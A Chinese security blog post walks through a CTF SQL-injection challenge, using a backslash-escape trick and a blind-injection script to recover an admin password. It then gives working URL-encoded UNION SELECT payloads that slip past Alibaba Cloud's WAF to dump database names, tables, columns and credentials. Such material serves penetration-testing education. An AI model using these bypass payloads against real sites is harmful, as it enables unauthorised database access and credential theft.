#  【技术分享】SQL-FUZZ技巧及阿里云waf绕过方式

星云博创  [ 迪哥讲事 ](javascript:void\(0\);)

**迪哥讲事** ![]()

微信号 growing0101

功能介绍 作者主页: https://github.com/richard1230

____

___发表于_

收录于合集

#sql 5 个

#waf 2 个

#bug bounty 401 个

## **前言**

今天，我们通过一道赛题来与大家分享sql注入的绕过技巧。大家在攻防中经常会遇到各种厂商开源或者商用的waf产品，那么“如何进行合理的绕过”其实是红队攻击人员必备的素养。![]()

 **01     **尝试初步注入，发现很多字符已被过滤。在burp进行
fuzz，暴力破解模块跑sql注入的关键字字典，我们发现基本注入的可能性为0。因为该过滤的字符都已被过滤完毕，没有过滤的按空格substr ascii ^。
![]()

  

 **02  **扫描发现，robots.txt得到提示——hint.txt，访问 hint.txt。

select * from users where username='$_POST["username"]' and
password='$_POST["password"]';

此处知识点——\是转义符，可以对’”\进行转义，使其失去本来的特殊意义；同时，这里的\是没有被过滤。

 **03     **如果传入 username=admin\ password=123456#，就会变成：

select * from users where username='admin\' and password='123456#';

可以理解为：

select * from users where username='admin and password=' 恶意代码 #';

post username=admin\ password=^(ascii(substr(password,1,1))>1000)#

 **04     **开始进行构造初步payload。

![]()

当 2>4 时，显示 girl friend；

当 2>1 时，显示 BJD needs to be stronger。

  

此时已经闭合成功。接下来就是直接查询密码即可，因为当前页面就是所调用的用户表，所以直接查询即可。

![]()

 **05     **当盲注 payload 里的ascii值>200时，页面回显如下。

![]()

 **06     **书写脚本即可。

![]()

 **07     **最终爆出密码为OhyOuFOuNdit，账号为admin。

登录即可获取flag。

 **彩蛋：绕过阿里云fuzz过程分享**

 **当输入and 1=1拦截，waf处于生效状态。**![]()

1\. 首先进行逻辑符与部分sql注入关键字判断。

and 1=1 拦截

and -1=-1 拦截

and 不拦截

xor 1 异常

xor 0 正常

%26 1=2 异常

%26 1=1 正常

%26 hex(1) 正常

%26 hex(0) 异常

and hex() 不拦截

order by 不拦截

order by 1 拦截

group by 1 不拦截

2\. 完整SQL注入的攻击语法如下，可以使用%0A%20—进行绕过，并添加一些关键词。

 **sql攻击语法：**

 **#获取所有数据库名称**

http://cz.aliyun.lvluoyun.com:8080/Tkitn/sqli-labs-
master/Less-1/index.php?id=-1%27%20UNION%0A%20-%20%20%20%20%99%20%0A%0A%0ASELECT%201,2,concat%23%0a(schema_name)%20from%20%20/*like%22%0d%0a%20%2d%2d%20%0d%22*/%20%0d%0a%20INFORMATION_SCHEMA%0d%0a.schemata%20limit%204,1--+![]()

 **#获取当前数据库表名称**

Less-1/?id=-1%27%20UNION%0A%20--%20%20%20%20%99%20%0A%0A%0ASELECT%201,2,concat(table_name)%20from%20%20/*like%22%0d%0a%20%2d%2d%20%0d%22*/%20%0d%0a%20INFORMATION_SCHEMA%0d%0a.tables%20where%20table_schema=database()%20limit%201,1--+

 **#获取users表所有字段**

?id=-1%27%20UNION%0A%20--%20%20%20%20%99%20%0A%0A%0ASELECT%201,2,concat(column_name)%20from%20%20/*like%22%0d%0a%20%2d%2d%20%0d%22*/%20%0d%0a%20INFORMATION_SCHEMA%0d%0a.columns%20where%20table_name='users'%20limit%200,1--+

 **#获取数据**

?id=-1%27%20UNION%0A%20--%20%20%20%20%99%20%0A%0A%0ASELECT%201,2,concat(username,0x7e,password)%20from%20users%20limit%202,1--+

 **#通用用例列表：**

![]()

  

##  福利视频

笔者自己录制的一套php视频教程(适合0基础的),感兴趣的童鞋可以看看,基础视频总共约200多集,目前已经录制完毕,后续还有更多视频出品

https://space.bilibili.com/177546377/channel/seriesdetail?sid=2949374

## 技术交流

技术交流请加笔者微信:richardo1o1 (暗号:growing)

如果你是一个长期主义者，欢迎加入我的知识星球([优先查看这个链接，里面可能还有优惠券](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247489122&idx=1&sn=a022eae85e06e46d769c60b2f608f2b8&chksm=e8a61c01dfd195170a090bce3e27dffdc123af1ca06d196aa1c7fe623a8957755f0cc67fe004&scene=21#wechat_redirect))，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72
小时内可在 App 内无条件自助退款

![]()

## 往期回顾

[2022年度精选文章  
](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[SSRF研究笔记  
](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486912&idx=1&sn=8704ce12dedf32923c6af49f1b139470&chksm=e8a607a3dfd18eb5abc302a40da024dbd6ada779267e31c20a0fe7bbc75a5947f19ba43db9c7&scene=21#wechat_redirect)

[xss研究笔记  
](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487130&idx=1&sn=e20bb0ee083d058c74b5a806c8a581b3&chksm=e8a604f9dfd18defaeb9306b89226dd3a5b776ce4fc194a699a317b29a95efd2098f386d7adb&scene=21#wechat_redirect)

[dom-
xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[Nuclei权威指南-
如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-
如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-
如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

